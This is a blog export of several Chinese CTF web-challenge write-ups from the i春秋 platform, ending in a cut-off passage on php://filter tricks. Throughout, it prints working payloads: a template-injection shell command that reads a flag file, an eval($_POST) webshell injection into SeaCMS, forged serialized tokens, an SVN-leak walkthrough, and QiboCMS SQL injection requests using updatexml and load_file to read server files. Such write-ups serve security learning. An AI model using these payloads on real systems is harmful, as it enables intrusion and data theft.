<p><img src="/2021/05/04/i-chun-qiu-web-fuzz/2b80f651f715ca9f6e12ef75c4ef515.png" alt="2b80f651f715ca9f6e12ef75c4ef515"></p>
<ul>
<li>Hello total 48</li>
<li>drwxr-xr-x. 2 root root  4096 May  5 03:47 .</li>
<li>drwxr-xr-x. 3 root root  4096 Nov  9  2016 ..</li>
<li>-rw-r–r–  1 root root    43 May  5 03:47 fl4g</li>
<li>-rw-r–r–. 1 root root 34913 Nov  9  2016 x.py</li>
</ul>
<p>查看fl4g文件（cat var/www/html/fl4g）</p>
<pre><code>?name={{ config['RUNCMD']('`echo Y2F0IC92YXIvd3d3L2h0bWwvZmw0Zwo= | base64 -d`',shell=True) }}</code></pre>
<p><img src="/2021/05/04/i-chun-qiu-web-fuzz/150037e3effd632359f01b4c3663d15.png" alt="150037e3effd632359f01b4c3663d15"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-fuzzing</title>
    <url>/2021/05/02/i-chun-qiu-web-fuzzing/</url>
    <content><![CDATA[<p>![805a9f457750436f8de5ac8442cd01b](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/e9a4ed1c33280a6351407e4ff28f074.png)</p>
<p><img src="/2021/05/02/i-chun-qiu-web-fuzzing/e9a4ed1c33280a6351407e4ff28f074-1620133312910.png" alt="e9a4ed1c33280a6351407e4ff28f074"></p>
<p><img src="https://img2018.cnblogs.com/blog/1712230/201909/1712230-20190911135451462-1664953434.png" alt="img"></p>
<p>或者：</p>
<pre><code>import hashlib

md5 = "1b4167610ba3f2ac426a68488dbd89be"
s = "abcdefghijklmnopqrstuvwxyz1234567890"

for i in s:
    for j in s:
        for k in s:
            key = "ichunqiu"+i+j+k
            if(hashlib.md5(key.encode("utf8")).hexdigest() == md5):
                print(key)
</code></pre>
<pre><code>ichunqiu105</code></pre>
<p><img src="/2021/05/02/i-chun-qiu-web-fuzzing/d9b926ce2870aef4573fef6cc22f1bc.png" alt="d9b926ce2870aef4573fef6cc22f1bc"></p>
<p>源码在x0.txt内，附上源码：</p>
<pre><code>function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {$ckey_length = 4;$key = md5($key ? $key : UC_KEY);
$keya = md5(substr($key, 0, 16));
$keyb = md5(substr($key, 16, 16));
$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';

$cryptkey = $keya . md5($keya . $keyc);
$key_length = strlen($cryptkey);

$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
$string_length = strlen($string);

$result = '';
$box = range(0, 255);

$rndkey = array();
for ($i = 0; $i &lt;= 255; $i++) {
    $rndkey[$i] = ord($cryptkey[$i % $key_length]);
}

for ($j = $i = 0; $i &lt; 256; $i++) {
    $j = ($j + $box[$i] + $rndkey[$i]) % 256;
    $tmp = $box[$i];
    $box[$i] = $box[$j];
    $box[$j] = $tmp;
}

for ($a = $j = $i = 0; $i &lt; $string_length; $i++) {
    $a = ($a + 1) % 256;
    $j = ($j + $box[$a]) % 256;
    $tmp = $box[$a];
    $box[$a] = $box[$j];
    $box[$j] = $tmp;
    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
}

if ($operation == 'DECODE') {
    if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
        return substr($result, 26);
    } else {
        return '';
    }
} else {
    return $keyc . str_replace('=', '', base64_encode($result));
}
}</code></pre>
<p>这个好像就是一个函数，而且是一个解密函数，DECODE嘛<br> 我们直接调用这个函数来解密<br> 直接echo</p>
<pre><code>echo authcode("d116+lpzwYGeuOp97fQ8DbwUogjZvXwKdAMW1skwPQ6mU2kjOKC3b4bhsN7N9hq03qAfaAXEavDq5YxLilcpnCnuM5ClG8g",$operation = 'DECODE', $key = 'ichunqiu105', $expiry = 0);</code></pre>
<p>php脚本：</p>
<pre><code>&lt;?php
function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length = 4;

    $key = md5($key ? $key : UC_KEY);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey = $keya . md5($keya . $keyc);
    $key_length = strlen($cryptkey);

    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
    $string_length = strlen($string);

    $result = '';
    $box = range(0, 255);

    $rndkey = array();
    for ($i = 0; $i &lt;= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for ($j = $i = 0; $i &lt; 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for ($a = $j = $i = 0; $i &lt; $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if ($operation == 'DECODE') {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc . str_replace('=', '', base64_encode($result));
    }

}

echo authcode($string = '9d9ezNRP5YbrHb40nkkbNmG4GcuMoHDky3fxTvwdpGQYClaNKgiYKVF7TuY+nsk2l05jNXMsBwFdhDeQOv+gxubgv4zIXn4', $operation = 'DECODE', $key = 'ichunqiu105');
?&gt;</code></pre>
<p><img src="/2021/05/02/i-chun-qiu-web-fuzzing/6b216aa16bcb87f8baae8b35b34bb79.png" alt="6b216aa16bcb87f8baae8b35b34bb79"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-test</title>
    <url>/2021/04/21/i-chun-qiu-web-test/</url>
    <content><![CDATA[<p>查了一下海洋cms</p>
<p><img src="/2021/04/21/i-chun-qiu-web-test/blog/source_posts\i春秋：Web-test\海洋cms.png" alt="海洋cms"></p>
<pre><code>http://4dbe057d8a0f42c19f0fabcb5693ed57d06b1c6f66c641a3.changame.ichunqiu.com/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</code></pre>
<p>蚁剑连接：</p>
<p><img src="/2021/04/21/i-chun-qiu-web-test/blog/source_posts\i春秋：Web-test\密码.png" alt="密码"></p>
<p>创建数据库</p>
<p><img src="/2021/04/21/i-chun-qiu-web-test/blog/source_posts\i春秋：Web-test\flag.png" alt="flag"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-login</title>
    <url>/2021/04/20/i-chun-qiu-web-login/</url>
    <content><![CDATA[<p>在查看中源码的最下面发现了 test1 test1</p>
<p>怀疑是账号 密码 </p>
<p>测试一下果然没错</p>
<p>进入member.php 页面 但是没用发现可用信息</p>
<pre><code>(╯‵□′)╯︵┴─┴</code></pre>
<p>于是burp suite拦截包看一下</p>
<p>添加show：1</p>
<pre><code>&lt;!-- &lt;?php
 include 'common.php';
 $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
 class db
 {
  public $where;
  function __wakeup()
  {
   if(!empty($this-&gt;where))
   {
    $this-&gt;select($this-&gt;where);
   }
  }

  function select($where)
  {
   $sql = mysql_query('select * from user where '.$where);
   return @mysql_fetch_array($sql);
  }
 }

 if(isset($requset['token']))
 {
  $login = unserialize(gzuncompress(base64_decode($requset['token'])));
  $db = new db();
  $row = $db-&gt;select('user=\''.mysql_real_escape_string($login['user']).'\'');
  if($login['user'] === 'ichunqiu')
  {
   echo $flag;
  }else if($row['pass'] !== $login['pass']){
   echo 'unserialize injection!!';
  }else{
   echo "(╯‵□′)╯︵┴─┴ ";
  }
 }else{
  header('Location: index.php?error=1');
 }

?&gt; --&gt;</code></pre>
<p>得知要得到flag需要满足 $login[‘user’] === ‘ichunqiu’</p>
<p>而user被$login = unserialize(gzuncompress(base64_decode($requset[‘token’])));处理过</p>
<p>我们重新编写一个程序解密即可</p>
<pre><code>&lt;?php 
$a = array('user'=&gt;'ichunqiu');
$b = base64_encode(gzcompress(serialize($a)));
echo $b
?&gt;</code></pre>
<p>输出：</p>
<pre><code>eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code></pre>
<p>修改token</p>
<p><img src="/2021/04/20/i-chun-qiu-web-login/blog/source_posts\i春秋：Web-login\3c9e1d6c3c46d0dac26acdcbb2bb2e3.png" alt="3c9e1d6c3c46d0dac26acdcbb2bb2e3"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-upload(svn泄露)</title>
    <url>/2021/05/08/i-chun-qiu-web-upload-svn-xie-lu/</url>
    <content><![CDATA[<h2 id="SVN源码泄露漏洞"><a href="#SVN源码泄露漏洞" class="headerlink" title="SVN源码泄露漏洞"></a>SVN源码泄露漏洞</h2><p><a href="https://blog.csdn.net/qq_36869808/article/details/88847364">https://blog.csdn.net/qq_36869808/article/details/88847364</a></p>
<p><strong>概要</strong>：SVN是源代码本本管理软件。使用SVN管理本地代码过程中，会生成一个名为.svn的隐藏文件夹，其中包含重要的源码信息。<br> <strong>出现原因</strong>：网站管理员在发布代码时，没有使用导出功能，直接进行复制粘贴。<br> <strong>漏洞例子</strong>：xxxx/.svn/entries</p>
<p>关于svn的原理之前看过很多个，但是大多就是造成泄露的原因，无非就是人为粗心导致的。</p>
<p>关于svn利用分两个版本一个版本是svn&gt;1.6，还有一个是svn&lt;1.6</p>
<p>svn&gt;1.6,文件名会被hash，然后再按照文件名对应hash的方式存到wc.db中,就是个sqlite数据库。最后我们按照名称遍历下载即可。</p>
<p>svn&lt;1.6,文件会先去读取entries文件的中的目录结构,因为默认文件名都是直接明文存的。</p>
<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><pre><code>import base64,requests
def main():
    a = requests.session()
    b = a.get("http://549bc9defbb74fc5bf83a53d5f194bccf641983365c0447b.changame.ichunqiu.com/")
    key1 = b.headers["flag"]
    c = base64.b64decode(key1)
    d = str(c).split(':')
    key = base64.b64decode(d[1])
    body = {"ichunqiu":key}
    f = a.post("http://549bc9defbb74fc5bf83a53d5f194bccf641983365c0447b.changame.ichunqiu.com/",data=body)
    print (f.text)
if __name__ == '__main__':
    main()</code></pre>
<p>字符串的意思是提示我们一个路径，不管了，访问之</p>
<p>Url/3712901a08bb58557943ca31f3487b7d</p>
<p>进去是一个普普通通的跳转界面，看源码没什么特别的</p>
<p>点按钮进入下一界面</p>
<p><img src="https://img2018.cnblogs.com/blog/1712230/201909/1712230-20190904230807381-697408493.png" alt="img"></p>
<p>就是一个登录界面了</p>
<p>svn泄露</p>
<p>访问</p>
<pre><code>/3712901a08bb58557943ca31f3487b7d/.svn/wc.db</code></pre>
<p>解开username是8638d5263ab0d3face193725c23ce095</p>
<p>3712901a08bb58557943ca31f3487b7d/7815696ecbf1c96e6894b779456d330e.php</p>
<p><img src="/2021/05/08/i-chun-qiu-web-upload-svn-xie-lu/5f82878beeb1d456ce6c635f6f709d2.png" alt="5f82878beeb1d456ce6c635f6f709d2"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-whoareyou</title>
    <url>/2021/04/19/i-chun-qiu-web-whoareyou/</url>
    <content><![CDATA[<p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\访问.png" alt="访问"></p>
<p>可能有以下几种可能：</p>
<p>​    1、敏感文件泄漏</p>
<p>​    2、跳转</p>
<p>​    3、cookie / session</p>
<p>访问cookie：</p>
<p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\cookie.png" alt="cookie"></p>
<p>base64解码</p>
<pre><code>f:5:"thrfg";</code></pre>
<p>rot13解码为guest（<a href="http://www.mxcz.net/tools/rot13.aspx%EF%BC%89">http://www.mxcz.net/tools/rot13.aspx）</a></p>
<p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\rot13.png" alt="rot13"></p>
<pre><code>f:5:"nqzva";</code></pre>
<p>base64加密</p>
<pre><code>Zjo1OiJucXp2YSI7</code></pre>
<p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\抓包.png" alt="抓包"></p>
<p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\修改.png" alt="抓包"></p>
<pre><code>filename=1.php&amp;data[]=&lt;?php phpinfo();?&gt;</code></pre>
<p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\i春秋：Web-whoareyou\flag.png" alt="flag"></p>
<p>但是访问不了</p>
<p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/a70948c7d864405f8cf59fb32855ae3.png" alt="a70948c7d864405f8cf59fb32855ae3"></p>
<p>没办法</p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-zone</title>
    <url>/2021/05/05/i-chun-qiu-web-zone/</url>
    <content><![CDATA[<p><img src="/2021/05/05/i-chun-qiu-web-zone/5bd4424eb057a35becb1bcdefa1e513.png" alt="5bd4424eb057a35becb1bcdefa1e513"></p>
<p><img src="/2021/05/05/i-chun-qiu-web-zone/dcde2241e79e9c544a3e51ff695a434.png" alt="dcde2241e79e9c544a3e51ff695a434"></p>
<p><img src="/2021/05/05/i-chun-qiu-web-zone/b1073fb6497f5a8f291a4d17922bf1c-1620205443760.png" alt="b1073fb6497f5a8f291a4d17922bf1c"></p>
<p><img src="/2021/05/05/i-chun-qiu-web-zone/0217231cc6d139dbfe81f2dbf3ccd6a-1620205448474.png" alt="0217231cc6d139dbfe81f2dbf3ccd6a"></p>
<p><img src="/2021/05/05/i-chun-qiu-web-zone/cadc5122fde6dc14284d9fd8d9b9f1b.png" alt="cadc5122fde6dc14284d9fd8d9b9f1b"></p>
<p><img src="/2021/05/05/i-chun-qiu-web-zone/5835aab478bd7dbd5efcc8089dbada1.png" alt="5835aab478bd7dbd5efcc8089dbada1"></p>
<p>直接访问下载也是可以的</p>
<p><img src="/2021/05/05/i-chun-qiu-web-zone/032dcbdbcf4d05dbf4bdffc7735673b.png" alt="032dcbdbcf4d05dbf4bdffc7735673b"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-再见CMS</title>
    <url>/2021/04/29/i-chun-qiu-web-zai-jian-cms/</url>
    <content><![CDATA[<p><img src="/2021/04/29/i-chun-qiu-web-zai-jian-cms/435a24540be807e64702b513922440a.png" alt="435a24540be807e64702b513922440a"></p>
<p>观察网站最下方，根据备案号搜到这是个齐博CMS，然后百度就可以搜到齐博CMS漏洞了</p>
<h2 id="齐博cms-userinfo注入"><a href="#齐博cms-userinfo注入" class="headerlink" title="齐博cms_userinfo注入"></a>齐博cms_userinfo注入</h2><p>就拿齐博整站系统为例。<br>看到/member/userinfo.php，112到114行：</p>
<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//过滤不健康的字</span>
$truename<span class="token operator">=</span><span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$truename<span class="token punctuation">)</span>
$introduce<span class="token operator">=</span><span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$introduce<span class="token punctuation">)</span><span class="token punctuation">;</span>
$address<span class="token operator">=</span><span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$address<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p> 这几句过滤代码，意思是想过滤一些“不和谐”的词语。那我们看看这个replace_bad_word函数。</p>
<pre class=" language-java"><code class="language-java">function <span class="token function">replace_bad_word</span><span class="token punctuation">(</span>$str<span class="token punctuation">)</span><span class="token punctuation">{</span>
global $Limitword<span class="token punctuation">;</span>
<span class="token annotation punctuation">@include_once</span><span class="token punctuation">(</span>ROOT_PATH<span class="token punctuation">.</span><span class="token string">"data/limitword.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">foreach</span><span class="token punctuation">(</span> $Limitword AS $old<span class="token operator">=</span><span class="token operator">></span>$<span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token function">strlen</span><span class="token punctuation">(</span>$old<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span> <span class="token operator">&amp;&amp;</span> $str<span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span>$old<span class="token punctuation">,</span><span class="token function">trim</span><span class="token punctuation">(</span>$<span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">,</span>$str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">return</span> $str<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>实际上是一个str_replace，将旧的“不和谐”词语替换成新的“和谐”词语。那么替换列表从哪来？看看data/limitword.php：</p>
<pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>php 
$Limitword<span class="token punctuation">[</span><span class="token string">'造反'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'造**'</span><span class="token punctuation">;</span>
$Limitword<span class="token punctuation">[</span><span class="token string">'法轮功'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'法**功'</span><span class="token punctuation">;</span></code></pre>
<p> 就这两个，$Limitword并没有初值。而且include之前有global  $Limitword。齐博cms是将GET和POST变量注册成全局变量了，所以global取到的可以是$_POST[Limitword]或$_GET[Limitword]。也就是说$Limitword是我们可以控制的。<br> 也就是说，我们可以控制str_replace函数的三个参数。不知道还有没有人记得ecshop曾经的一个注入漏洞，原理相同，我再说一遍。<br> 某变量$str全局做过转义，导致%00转义成了\0.我们能够控制str_replace的前两个参数，则str_replace(‘0’, ‘’, $str)，再将0转换成空，则留下了\，这个\可以转义其后的\’，使之变成\’，导致单引号逃逸出转义符的限制，造成注入。<br> 这里的原理是一样的，只不过齐博cms之前对一些变量做了过滤：</p>
<pre class=" language-java"><code class="language-java">$truename<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$truename<span class="token punctuation">)</span><span class="token punctuation">;</span>
$idcard<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$idcard<span class="token punctuation">)</span><span class="token punctuation">;</span>
$telephone<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$telephone<span class="token punctuation">)</span><span class="token punctuation">;</span>
$address<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$address<span class="token punctuation">)</span><span class="token punctuation">;</span>
$introduce<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$introduce<span class="token punctuation">)</span><span class="token punctuation">;</span>
$homepage<span class="token operator">=</span><span class="token function">filtrate</span><span class="token punctuation">(</span>$homepage<span class="token punctuation">)</span><span class="token punctuation">;</span>
function <span class="token function">filtrate</span><span class="token punctuation">(</span>$msg<span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token comment" spellcheck="true">//$msg = str_replace('&amp;','&amp;amp;',$msg);</span>
<span class="token comment" spellcheck="true">//$msg = str_replace(' ','&amp;nbsp;',$msg);</span>
$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;quot;'</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">'&amp;#39;'</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"&amp;lt;"</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"&amp;gt;"</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"   &amp;nbsp;  &amp;nbsp;"</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//$msg = str_replace("\r","",$msg);</span>
$msg <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"   "</span><span class="token punctuation">,</span><span class="token string">" &amp;nbsp; "</span><span class="token punctuation">,</span>$msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> $msg<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>将’等敏感字符过滤了。就算有一个\可以转义一个’，但是这里连’都引入不了。<br> 没关系，这个文件是更新用户信息用的，执行的语句类似update table set a=’111’,b=’222’ where  uid=1，我们引入一个\在111的最后，转义掉111后面的引号，这样222就逃逸出了限制，我们的sql注入语句就可以放在222的位置执行了。这个和之前discuz7.2的faq.php那个注入类似： WooYun: Discuz7存在一处SQL注射漏洞（无需登录即可触发）<br> 所以，完美构造了一个SQL注入。</p>
<p>先注册一个用户：</p>
<p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100933358.jpg" alt="04.jpg"></p>
<p> 记下自己的uid，以便一会更新数据：</p>
<p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934359.jpg" alt="05.jpg"></p>
<p>可以先测试一下是否存在注入：</p>
<p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934360.jpg" alt="07.jpg"><br> 报错了，说明注入是存在的。<br> 简单构造一下，向<a href="http://localhost/qibov7/member/userinfo.php?job=edit&amp;step=2%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%9A">http://localhost/qibov7/member/userinfo.php?job=edit&amp;step=2发送数据包：</a><br> truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select user()) where uid=38%23</p>
<p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934361.jpg" alt="06.jpg"></p>
<p>将address注入成为user()。Where后面加上uid=2，防止把其他人的address也注入了。<br>  查看个人注入的地址，即可见注入获得的结果：</p>
<p><img src="http://www.2cto.com/uploadfile/Collfiles/20141231/20141231100934362.jpg" alt="08.jpg"></p>
<p> 这个洞是通杀齐博所有系统的，经测试齐博整站系统、齐博地方门户都可以中招，没试其他一些系统了，我估计很多都得中招。</p>
<p>参考：<a href="https://blog.csdn.net/qq_33020901/article/details/52593063">https://blog.csdn.net/qq_33020901/article/details/52593063</a></p>
<h2 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h2><p>首先尝试了在用户信息修改处进行注入，发现好像想不通了，就在博客界面进行注入</p>
<p>Payload：</p>
<p>获取版本信息</p>
<p>[<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20version()),0x7e),1)))a%23%5D">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20version()),0x7e),1)))a%23]</a>(<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=</a>(select * from information_schema.tables where 1=2 or (updatexml(1,concat(0x7e,(select version()),0x7e),1)))a%23)</p>
<p>获取数据库名称</p>
<p>[<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20database()),0x7e),1)))a%23%5D">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(select%20database()),0x7e),1)))a%23]</a>(<a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=</a>(select * from information_schema.tables where 1=2 or (updatexml(1,concat(0x7e,(select database()),0x7e),1)))a%23)</p>
<p>然后获取表，列，数据信息，发现并没有我们想要的flag，所以说flag不在这里</p>
<p>根据标题提示<img src="https://img2018.cnblogs.com/blog/1712230/201907/1712230-20190724213647420-1130270981.png" alt="img"></p>
<p>flag可能跟之前一样在/var/www/html/flag.php中</p>
<p>然后使用select load_file函数试了试select load_file(“/var/www/html/flag.php”)和select load_file(‘/var/www/html/flag.php’)，发现 ’ 在被提交时会转变成 \’</p>
<p><img src="https://img2018.cnblogs.com/blog/1712230/201907/1712230-20190724213700756-1210776533.png" alt="img"></p>
<p>“ 同样</p>
<p>所以这里不能使用 ’ 与 ” 了，改为16进制</p>
<p>0x2F7661722F7777772F68746D6C2F666C61672E706870</p>
<p>构造payload</p>
<p><a href="http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(%20select%20mid((select%20load_file(0x2F7661722F7777772F68746D6C2F666C61672E706870)),1,32)%20),0x7e),1)))a%23">http://2743f65d1ee44b2dbed1eee0a12863d3fa07aa9eccab467e.changame.ichunqiu.com/blog/index.php?file=listbbs&amp;uid=1&amp;id=1&amp;TB_pre=(select%20*%20from%20information_schema.tables%20where%201=2%20or%20(updatexml(1,concat(0x7e,(%20select%20mid((select%20load_file(0x2F7661722F7777772F68746D6C2F666C61672E706870)),1,32)%20),0x7e),1)))a%23</a></p>
<p>通过不断不断更改1的值得到flag</p>
<p><img src="https://img2018.cnblogs.com/blog/1712230/201907/1712230-20190724213716846-1712917864.png" alt="img"></p>
<pre><code>flag{9b0025d8-a22f-495c-b837-ed94a127415d}</code></pre>
<p><img src="/2021/04/29/i-chun-qiu-web-zai-jian-cms/be29f7fb70b0a46eabb8947279d4e37.png" alt="be29f7fb70b0a46eabb8947279d4e37"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>php://filter绕过exit()</title>
    <url>/2021/10/02/php-filter-rao-guo-exit/</url>
    <content><![CDATA[<p>原文：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p>
<p>php://filter是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。</p>
<h2 id="XXE中的使用"><a href="#XXE中的使用" class="headerlink" title="XXE中的使用"></a>XXE中的使用</h2><p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p>
<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
<pre><code>readfile("php://filter/read=convert.base64-encode/resource=php://input");</code></pre>
<p>如下：</p>
